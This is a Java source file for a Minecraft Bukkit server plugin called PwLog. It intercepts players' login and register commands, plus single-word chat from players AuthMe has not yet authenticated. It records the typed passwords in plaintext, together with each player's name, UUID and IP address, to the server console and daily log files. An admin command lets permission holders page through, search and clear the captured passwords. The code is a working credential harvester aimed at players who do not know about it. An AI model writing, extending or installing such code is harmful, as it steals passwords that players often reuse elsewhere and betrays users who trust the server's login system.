package com.example.pwlogger;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class PwLog extends JavaPlugin {

    private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final List<String> LOGIN = Arrays.asList("login", "l", "log");
    private static final List<String> REGISTER = Arrays.asList("register", "reg");
    private static final int PAGE_SIZE = 10;
    private static final long MAX_BYTES = 5_000_000L;
    private static final int KEEP_DAYS = 30;

    @Override
    public void onEnable() {
        getDataFolder().mkdirs();
        prune();
        getServer().getPluginManager().registerEvents(new Hook(), this);
        PluginCommand cmd = getCommand("pwlog");
        if (cmd != null) {
            Cmd exec = new Cmd();
            cmd.setExecutor(exec);
            cmd.setTabCompleter(exec);
        }
        getLogger().info("PwLog enabled");
    }

    Path todayFile() {
        return new File(getDataFolder(), "log-" + LocalDate.now() + ".log").toPath();
    }

    synchronized void record(String player, String uuid, String ip, String kind, String password) {
        String line = TS.format(LocalDateTime.now()) + " | " + player + " | " + uuid
                + " | " + ip + " | " + kind + " | " + password;
        getLogger().info(line);
        try {
            Path file = todayFile();
            Files.createDirectories(file.getParent());
            if (Files.exists(file) && Files.size(file) >= MAX_BYTES) {
                Files.move(file, file.resolveSibling(file.getFileName() + "." + System.currentTimeMillis() + ".old"));
            }
            Files.writeString(file, line + System.lineSeparator(), StandardCharsets.UTF_8,
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException ex) {
            getLogger().warning("write failed: " + ex.getMessage());
        }
    }

    private void prune() {
        long cutoff = System.currentTimeMillis() - (KEEP_DAYS * 86_400_000L);
        File[] files = getDataFolder().listFiles();
        if (files == null) {
            return;
        }
        for (File f : files) {
            if (f.isFile() && f.lastModified() < cutoff) {
                f.delete();
            }
        }
    }

    final class Hook implements Listener {

        @EventHandler(priority = EventPriority.LOWEST)
        public void onCommand(PlayerCommandPreprocessEvent event) {
            String raw = event.getMessage();
            if (raw == null || raw.length() < 2) {
                return;
            }
            String[] parts = raw.substring(1).trim().split("\\s+");
            if (parts.length < 2) {
                return;
            }
            String cmd = parts[0].toLowerCase(Locale.ROOT);
            int colon = cmd.indexOf(':');
            if (colon >= 0) {
                cmd = cmd.substring(colon + 1);
            }
            String kind;
            if (LOGIN.contains(cmd)) {
                kind = "LOGIN";
            } else if (REGISTER.contains(cmd)) {
                kind = "REGISTER";
            } else {
                return;
            }
            record(event.getPlayer(), kind, parts[1]);
        }

        @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
        public void onChat(AsyncPlayerChatEvent event) {
            Player player = event.getPlayer();
            if (isAuthenticated(player)) {
                return;
            }
            String msg = event.getMessage().trim();
            if (msg.isEmpty() || msg.split("\\s+").length > 1) {
                return;
            }
            record(player, "CHAT", msg);
        }

        private boolean isAuthenticated(Player player) {
            try {
                Object api = Class.forName("fr.xephi.authme.api.v3.AuthMeApi")
                        .getMethod("getInstance").invoke(null);
                return (Boolean) api.getClass().getMethod("isAuthenticated", Player.class).invoke(api, player);
            } catch (Throwable ignored) {
                return true;
            }
        }

        private void record(Player player, String kind, String password) {
            String uuid = player.getUniqueId().toString();
            String ip = player.getAddress() == null ? "?" : player.getAddress().getAddress().getHostAddress();
            getServer().getScheduler().runTaskAsynchronously(PwLog.this,
                    () -> PwLog.this.record(player.getName(), uuid, ip, kind, password));
        }
    }

    final class Cmd implements CommandExecutor, TabCompleter {

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!sender.hasPermission("pwlog.view")) {
                sender.sendMessage("§cNo permission.");
                return true;
            }

            if (args.length > 0 && args[0].equalsIgnoreCase("clear")) {
                try {
                    Files.deleteIfExists(todayFile());
                    sender.sendMessage("§aToday's log cleared.");
                } catch (IOException ex) {
                    sender.sendMessage("§cDelete failed: " + ex.getMessage());
                }
                return true;
            }

            List<String> lines;
            try {
                Path file = todayFile();
                lines = Files.exists(file) ? Files.readAllLines(file, StandardCharsets.UTF_8) : new ArrayList<>();
            } catch (IOException ex) {
                sender.sendMessage("§cRead failed: " + ex.getMessage());
                return true;
            }

            String filter = null;
            int page = 1;

            if (args.length >= 2 && args[0].equalsIgnoreCase("search")) {
                filter = args[1].toLowerCase(Locale.ROOT);
            } else if (args.length >= 1) {
                try {
                    page = Math.max(1, Integer.parseInt(args[0]));
                } catch (NumberFormatException ignored) {
                    page = 1;
                }
            }

            if (filter != null) {
                final String needle = filter;
                lines.removeIf(l -> !l.toLowerCase(Locale.ROOT).contains(needle));
            }

            if (lines.isEmpty()) {
                sender.sendMessage("§7No entries.");
                return true;
            }

            Collections.reverse(lines);
            int pages = (lines.size() + PAGE_SIZE - 1) / PAGE_SIZE;
            page = Math.min(page, pages);
            int from = (page - 1) * PAGE_SIZE;
            int to = Math.min(from + PAGE_SIZE, lines.size());

            sender.sendMessage("§8-- §bPwLog §8-- §7page " + page + "/" + pages + " (" + lines.size() + " total)");
            for (int i = from; i < to; i++) {
                sender.sendMessage("§8" + (i + 1) + " §7" + lines.get(i));
            }
            return true;
        }

        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            if (args.length == 1) {
                List<String> out = new ArrayList<>(Arrays.asList("1", "2", "3", "search", "clear"));
                out.removeIf(s -> !s.startsWith(args[0].toLowerCase(Locale.ROOT)));
                return out;
            }
            return Collections.emptyList();
        }
    }
}
